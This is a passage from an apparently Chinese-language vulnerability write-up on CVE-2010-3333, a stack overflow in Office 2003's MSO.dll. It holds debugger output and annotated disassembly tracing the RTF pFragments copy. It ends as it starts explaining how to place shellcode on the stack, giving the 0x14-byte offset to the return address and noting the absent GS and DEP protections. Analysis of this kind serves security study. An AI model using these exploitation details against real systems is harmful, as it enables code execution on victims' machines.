FileDescription:</span>  Microsoft Office <span class="number">2003</span> component</span><br><span class="line"><span class="symbol">    LegalCopyright:</span>   Copyright © <span class="number">1983</span>-<span class="number">2003</span> Microsoft Corporation.  All rights reserved.</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;根据<code>调试器</code>输出的信息，可以知道，这是一个<code>异常</code>在异常处理之前<code>第一次</code>发送给<code>调试器</code>，说明发生了一个异常。<code>0x30ed442c</code>处的指令可以看作是<code>rep movsd</code>，这条指令的作用是从<code>源地址(esi)</code>循环复制数据到<code>目的地址(edi)</code>，每次复制一个<code>dword</code>。我们可以看到此时的<code>目的地址(edi)</code>为<code>0x00130000</code>，在<code>32位</code>Windows中，此地址应该是<code>栈底</code>，栈底之后的内存应该是<code>不具有写权限</code>的，所以这里发生了<code>非法内存访问</code>。通过<code>“!address edi”</code>命令,我们可以知道<code>0x00130000</code>地址处的内存只具有<code>读权限</code>。通过<code>“lm v m mso”</code>命令，我们可以得到<code>MSO.dll</code>模块相关信息，如<code>加载基址</code>。如果开启了<code>ASLR</code>，其加载基址每次都会不同，当然在<code>Windows XP</code>中是不会变的，Windows XP只支持<code>PEB、TEB的ASLR</code>，不支持<code>映像的ASLR</code>。</p><p>&emsp;&emsp;经过这简单的分析，可以知道这个漏洞是<code>MSO.dll</code>中的一处<code>栈溢出</code>漏洞，由于未检测<code>复制数据的长度</code>，通过<code>rep movsd</code>指令循环复制内存数据到<code>栈</code>上，导致对<code>0x00130000</code>这个<code>只读</code>内存地址进行<code>写数据</code>，造成<code>非法访问内存异常</code>。</p><p>&emsp;&emsp;我们对<code>触发异常</code>的指令的地址<code>0x30ed442c</code>下断点，其位于<code>sub_30ED4406</code>函数中，我们称其为<code>CrashFun</code>，通过<code>栈回溯</code>查看是哪个函数调用了<code>sub_30ED4406</code>函数。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; <span class="built_in">bp</span> 30ed442c</span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">06740000</span> 068e1000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 5fdd0000 5fe25000   C:\WINDOWS\system32\NETAPI32.dll</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=0000322b <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104000c <span class="built_in">edi</span>=001237dc</span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="symbol">WARNING:</span> Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line">001237ec 30f0b56b <span class="number">00123958</span> <span class="number">00000000</span> ffffffff mso!Ordinal1246+<span class="number">0x16b0</span></span><br><span class="line">0012381c 30f0b4f9 001239a4 <span class="number">00123958</span> <span class="number">00000000</span> mso!Ordinal1273+<span class="number">0x2581</span> &lt;----</span><br><span class="line">00123a68 30d4d795 <span class="number">00000000</span> 00123aa8 <span class="number">00000000</span> mso!Ordinal1273+<span class="number">0x250f</span></span><br><span class="line">00123a90 30d4d70d 30d4d5a8 01c40b88 01c40bc0 mso!Ordinal5575+<span class="number">0xf9</span></span><br><span class="line">00123a94 30d4d5a8 01c40b88 01c40bc0 01c40a70 mso!Ordinal5575+<span class="number">0x71</span></span><br><span class="line">00123a98 01c40b88 01c40bc0 01c40a70 30dce40c mso!Ordinal4099+<span class="number">0xf5</span></span><br><span class="line">00123a9c 01c40bc0 01c40a70 30dce40c <span class="number">00000000</span> <span class="number">0x1c40b88</span></span><br><span class="line">00123aa0 01c40a70 30dce40c <span class="number">00000000</span> 01c4084c <span class="number">0x1c40bc0</span></span><br><span class="line">00123aa4 30dce40c <span class="number">00000000</span> 01c4084c <span class="number">00124854</span> <span class="number">0x1c40a70</span></span><br><span class="line">00123aa8 <span class="number">00000000</span> 01c4084c <span class="number">00124854</span> <span class="number">00000000</span> mso!Ordinal2940+<span class="number">0x1588c</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; ub mso!Ordinal1273+<span class="number">0x2581</span></span><br><span class="line">mso!Ordinal1273+<span class="number">0x256d</span>:</span><br><span class="line">30f0b557 23c1            <span class="keyword">and</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">30f0b559 <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line">30f0b55a 8d47ff          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">edi</span>-<span class="number">1</span>]</span><br><span class="line">30f0b55d <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line">30f0b55e 8b4508          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">30f0b561 6a00            <span class="keyword">push</span>    <span class="number">0</span></span><br><span class="line">30f0b563 ff750c          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]</span><br><span class="line">30f0b566 e857000000      <span class="keyword">call</span>    mso!Ordinal1273+<span class="number">0x25d8</span> (30f0b5c2)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过<code>栈回溯</code>，我们可以知道<code>CrashFun(sub_30ED4406)</code>是在函数<code>sub_30F0B5C2</code>中调用的。重新调试，对<code>sub_30F0B5C2</code>函数下断点，从函数<code>sub_30F0B5C2</code>到溢出地址<code>0x30ed442c</code>开始单步调试(F10:步过,F8:步进)，经过处理后的结果如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>30F0B544           loc_30F0B544                         <span class="comment">; CODE XREF: sub_30F0B506+2B↑j</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B544                                                <span class="comment">; sub_30F0B506+37↑j</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B544 8B <span class="number">75</span> <span class="number">10</span>               <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_8]</span><br><span class="line"><span class="symbol">.text:</span>30F0B547 <span class="number">83</span> <span class="number">65</span> FC <span class="number">00</span>            <span class="keyword">and</span>     [<span class="built_in">ebp</span>+var_4], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B54B FF <span class="number">75</span> <span class="number">14</span>               <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_C]</span><br><span class="line"><span class="symbol">.text:</span>30F0B54E 8B C6                  <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B550 F7 D8                  <span class="keyword">neg</span>     <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B552 <span class="number">1B</span> C0                  <span class="keyword">sbb</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B554 <span class="number">8D</span> <span class="number">4D</span> FC               <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_4]</span><br><span class="line"><span class="symbol">.text:</span>30F0B557 <span class="number">23</span> C1                  <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B559 <span class="number">50</span>                     <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B55A <span class="number">8D</span> <span class="number">47</span> FF               <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">edi</span>-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>30F0B55D <span class="number">50</span>                     <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B55E 8B <span class="number">45</span> <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>30F0B561 6A <span class="number">00</span>                  <span class="keyword">push</span>    <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B563 FF <span class="number">75</span> 0C               <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>30F0B566 E8 <span class="number">57</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         <span class="keyword">call</span>    sub_30F0B5C2 &lt;-----</span><br><span class="line"><span class="symbol">.text:</span>30F0B56B <span class="number">84</span> C0                  <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line">*************************************************************************************************</span><br><span class="line"></span><br><span class="line">    char __userpurge sub_30F0B5C2@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">eax</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>30F0B5C2 <span class="number">55</span>                     <span class="keyword">push</span>    <span class="built_in">ebp</span>                 <span class="comment">;     ebp = 0x0012381c</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5C3 8B EC                  <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>            <span class="comment">;     ebp = esp = 0x001237ec</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5C5 <span class="number">83</span> EC <span class="number">14</span>               <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">14h</span>            <span class="comment">; 分配0x14字节栈空间: esp = esp-0x14 = 0x001237ec-0x14 = 0x001237d8 </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5C8 <span class="number">83</span> <span class="number">7D</span> <span class="number">18</span> <span class="number">00</span>            <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_10], <span class="number">0</span>     <span class="comment">;     [ebp+0x18] = [0x00123804]=0x01c40ba0</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5CC <span class="number">57</span>                     <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">;     edi = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5CD 8B F8                  <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>            <span class="comment">;     edi = eax = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5CF 0F <span class="number">84</span> <span class="number">1D</span> 4C <span class="number">18</span> <span class="number">00</span>      <span class="keyword">jz</span>      loc_310901F2        <span class="comment">;     不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5D5 8B 4F <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">edi</span>+<span class="number">8</span>]        <span class="comment">; ecx = [edi+8] = [0x001239a4+0x8] = [0x001239ac] = 0x00123aa8(像是对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5D8 <span class="number">53</span>                     <span class="keyword">push</span>    <span class="built_in">ebx</span>                 <span class="comment">;     ebx = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5D9 <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">;     esi = 0x00000000 </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5DA E8 C4 E8 E1 FF         <span class="keyword">call</span>    sub_30D29EA3        <span class="comment">; thiscall</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">    ***********************************************************************</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">int</span> __thiscall sub_30D29EA3(_<span class="built_in">BYTE</span> *this)</span><br><span class="line"></span><br><span class="line">    ***********************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>30D29EA3          sub_30D29EA3  proc <span class="built_in">near</span>              </span><br><span class="line"><span class="symbol">    .text:</span>30D29EA3                                               </span><br><span class="line"><span class="symbol">    .text:</span>30D29EA3 <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">; esi = 0x00000000</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EA4 8B F1                  <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>            <span class="comment">; esi = ecx = 0x00123aa8(像是对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EA6 <span class="number">57</span>                     <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">; edi = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EA7 <span class="number">8D</span> BE C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>      <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">esi</span>+<span class="number">0C0h</span>]     <span class="comment">; edi = esi+0xc0 = 0x00123aa8+0xc0 = 0x00123B68</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EAD F6 <span class="number">07</span> <span class="number">01</span>               <span class="keyword">test</span>    <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>], <span class="number">1</span>   <span class="comment">; [edi] = [0x00123B68] = 0x73('s')</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB0 <span class="number">74</span> <span class="number">09</span>                  <span class="keyword">jz</span>      short loc_30D29EBB  <span class="comment">; 等于0跳转,这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB2         loc_30D29EB2:                         </span><br><span class="line"><span class="symbol">    .text:</span>30D29EB2 5F                     <span class="keyword">pop</span>     <span class="built_in">edi</span>                 <span class="comment">; edi = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB3 <span class="number">8D</span> <span class="number">86</span> C4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>+<span class="number">0C4h</span>]     <span class="comment">; eax = esi+0xc4 = 0x00123aa8+0xc4 = 0x00123b6c</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EB9 5E                     <span class="keyword">pop</span>     <span class="built_in">esi</span>                 <span class="comment">; esi = 0x00000000</span></span><br><span class="line"><span class="symbol">    .text:</span>30D29EBA C3                     <span class="keyword">retn</span>                        <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>30F0B5DF FF <span class="number">75</span> 0C               <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]         <span class="comment">; arg3: [ebp+0xC] = [0x001237ec+0xC] = [0x001237f8] = 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5E2 8B <span class="number">70</span> <span class="number">64</span>               <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">eax</span>+<span class="number">64h</span>]      <span class="comment">;     esi = [0x00123b6c+0x64] = [0x00123bd0] = 0x01c40824(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5E5 <span class="number">83</span> <span class="number">65</span> F8 <span class="number">00</span>            <span class="keyword">and</span>     [<span class="built_in">ebp</span>+var_8], <span class="number">0</span>      <span class="comment">;     [ebp-0x8] = [0x001237ec-0x8] = [0x001237e4]=0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5E9 8B <span class="number">06</span>                  <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]          <span class="comment">;     eax = [esi] = [0x01c40824] = 0x30da33d8(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5EB <span class="number">8D</span> <span class="number">4D</span> F0               <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_10]   <span class="comment">;     ecx = ebp-0x10 = 0x001237ec-0x10 = 0x001237dc</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5EE <span class="number">51</span>                     <span class="keyword">push</span>    <span class="built_in">ecx</span>                 <span class="comment">; arg2: ecx = 0x001237dc &lt;----目的地址</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5EF BB <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">05</span>         <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="number">5000000h</span>       <span class="comment">;     ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5F4 <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">; arg1: esi = 0x01c40824 &lt;----对象首地址</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5F5 <span class="number">89</span> <span class="number">5D</span> F4               <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_C], <span class="built_in">ebx</span>    <span class="comment">;     [ebp-0xc] = [0x001237ec-0xc] = [0x001237e0] = 0x05000000</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5F8 FF <span class="number">50</span> 1C               <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">1Ch</span>] &lt;----- [<span class="built_in">eax</span>+<span class="number">1Ch</span>] = [<span class="number">0x30da33d8</span>+<span class="number">0x1c</span>] = [<span class="number">0x30da33f4</span>] = <span class="number">0x30ED4406</span>(虚函数地址)</span><br><span class="line"><span class="symbol">.text:</span>30F0B5FB 8B <span class="number">45</span> <span class="number">14</span>               <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_C]</span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line">*************************************************************</span><br><span class="line"></span><br><span class="line">    void __stdcall sub_30ED4406(<span class="keyword">int</span> a1, void *a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">*************************************************************</span><br><span class="line"><span class="symbol">.text:</span>30ED4406 <span class="number">57</span>                     <span class="keyword">push</span>    <span class="built_in">edi</span>                 <span class="comment">;     edi = 0x001239a4(像是对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4407 8B 7C <span class="number">24</span> 0C            <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">esp</span>+<span class="number">4</span>+arg_4]  <span class="comment">; 目的地址: edi = [esp+4+8] = [0x001237b8+0xc] = [0x001237c4] = 0x001237dc(a2)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED440B <span class="number">85</span> FF                  <span class="keyword">test</span>    <span class="built_in">edi</span>, <span class="built_in">edi</span>            <span class="comment">;     edi &amp; edi</span></span><br><span class="line"><span class="symbol">.text:</span>30ED440D <span class="number">74</span> <span class="number">27</span>                  <span class="keyword">jz</span>      short loc_30ED4436  <span class="comment">;     edi为0,则跳转,这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>30ED440F 8B <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>            <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">4</span>+arg_0]  <span class="comment">;     eax = [esp+4+4] = [0x001237b8+0x8]= [0x001237c0] = 0x01c40824(a1) &lt;----对象首地址</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4413 8B <span class="number">48</span> <span class="number">08</span>               <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>+<span class="number">8</span>]        <span class="comment">;     ecx = [eax+0x8] = [0x01c40824+0x8] = [0x01c4082c] = 0x0004c8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4416 <span class="number">81</span> E1 FF FF <span class="number">00</span> <span class="number">00</span>      <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span>         <span class="comment">;     ecx = ecx &amp; 0xFFFF = 0xc8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED441C <span class="number">56</span>                     <span class="keyword">push</span>    <span class="built_in">esi</span>                 <span class="comment">;     esi = 0x01c40824(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED441D 8B F1                  <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>            <span class="comment">;     esi = ecx = 0xc8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED441F 0F AF <span class="number">74</span> <span class="number">24</span> <span class="number">14</span>         <span class="keyword">imul</span>    <span class="built_in">esi</span>, [<span class="built_in">esp</span>+<span class="number">8</span>+arg_8]  <span class="comment">;     esi = esi*[esp+8+0xc] = 0xc8ac*[0x001237b4+0x14] = 0xc8ac*[0x001237c8] = 0xc8ac*0x00000000 = 0x0(a3)</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4424 <span class="number">03</span> <span class="number">70</span> <span class="number">10</span>               <span class="keyword">add</span>     <span class="built_in">esi</span>, [<span class="built_in">eax</span>+<span class="number">10h</span>]      <span class="comment">; 源地址: esi = esi + [0x01c40824+0x10] = 0 + [0x01c40834] = 0x1104000c</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4427 8B C1                  <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span>            <span class="comment">; 返回复制数据长度(字节): eax = ecx = 0xc8ac</span></span><br><span class="line"><span class="symbol">.text:</span>30ED4429 C1 E9 <span class="number">02</span>               <span class="keyword">shr</span>     <span class="built_in">ecx</span>, <span class="number">2</span>              <span class="comment">; 复制数据dword数: ecx = ecx &gt;&gt; 2 = 0xc8ac/4 = 0x0000322b </span></span><br><span class="line"><span class="symbol">.text:</span>30ED442C F3 A5                  <span class="keyword">rep</span> <span class="keyword">movsd</span>                   <span class="comment">; rep movs dword ptr es:[edi],dword ptr [esi]</span></span><br><span class="line">                                                                栈数据：</span><br><span class="line">                                                                001237B4   01C40824 &lt;-<span class="built_in">esp</span></span><br><span class="line">                                                                001237B8   001239A4</span><br><span class="line">                                                                001237BC   30F0B5FB  返回到 mso.30F0B5FB</span><br><span class="line">                                                                001237C0   01C40824</span><br><span class="line">                                                                001237C4   001237DC</span><br><span class="line">                                                                001237C8   <span class="number">00000000</span></span><br><span class="line">                                                                001237CC   <span class="number">00000000</span></span><br><span class="line">                                                                001237D0   <span class="number">00000000</span></span><br><span class="line">                                                                001237D4   <span class="number">00000000</span></span><br><span class="line">                                                                001237D8   0000FF35</span><br><span class="line">                                                                001237DC   FFFF0000 &lt;-pFragments缓冲区起始地址</span><br><span class="line">                                                                001237E0   <span class="number">05000000</span></span><br><span class="line">                                                                001237E4   <span class="number">00000000</span></span><br><span class="line">                                                                001237E8   0000FFFF</span><br><span class="line">                                                                001237EC   0012381C &lt;-<span class="built_in">ebp</span></span><br><span class="line">                                                                001237F0   30F0B56B  返回到 mso.30F0B56B 来自 mso.30F0B5C2</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;根据调试的结果，我们可以知道，<code>CrashFun(sub_30ED4406)</code>是在函数<code>sub_30F0B5C2</code>中地址<code>0x30F0B5F8</code>处的指令调用的。最后一条指令是<code>rep movsd</code>，其从<code>源地址(esi=0x1104000c)</code>循环复制数据到<code>目的地址(edi=0x001237dc)</code>，每次复制一个<code>dword</code>，复制数据的<code>dword个数</code>在<code>ecx(0x322b)</code>中，也就是<code>0xc8ac字节</code>。其实这个长度是源于<code>样本数据</code>的，它位于<code>pFragements</code>属性值的<code>第3个字段</code>，<code>偏移8个字符</code>后的<code>4个字符</code>即为复制数据的大小，如图：<br><img src="/resources/2020/CVE-2010-3333/pFragements.png" alt="样本中代表复制内存大小的数据"></p><p>&emsp;&emsp;<code>pFragements</code>数据在<code>栈</code>上的缓冲区的<code>起始地址</code>为<code>0x001237DC</code>,而<code>ebp</code>为<code>0x001237EC</code>,其后就是函数<code>sub_30ED4406</code>的<code>返回地址</code>。由于PoC中的pFragements属性值的数据量过大，覆盖到<code>不可写的内存地址</code>导致异常，所以并没有去<code>执行</code>覆盖后的<code>返回地址</code>以及<code>SEH异常处理函数</code>(SEH链被破坏了)。根据<code>MSO.dll</code>模块函数的<code>反汇编特征</code>，可以看出，<code>MSO.dll</code>模块并没有开启<code>GS</code>。通过查看<code>MSO.dll</code>的<code>IMAGE_OPTIONAL_HEADER</code>中的<code>DllCharacteristics</code>字段，其并没有设置<code>IMAGE_DLLCHARACTERISTICS_NX_COMPAT</code>标志，可以知道MSO.dll并没有开启<code>DEP</code>，即使开启了DEP，在<code>Windows XP SP3</code>上也是没有效果的。</p><p>&emsp;&emsp;所以我们可以将<code>Shellcode</code>直接布置在<code>栈</code>上，首先需要填充<code>pFragments缓冲区起始地址</code>到<code>保存返回地址的栈地址</code>之前的栈内存，是<code>0x14</code>字节，然后用<code>jmp 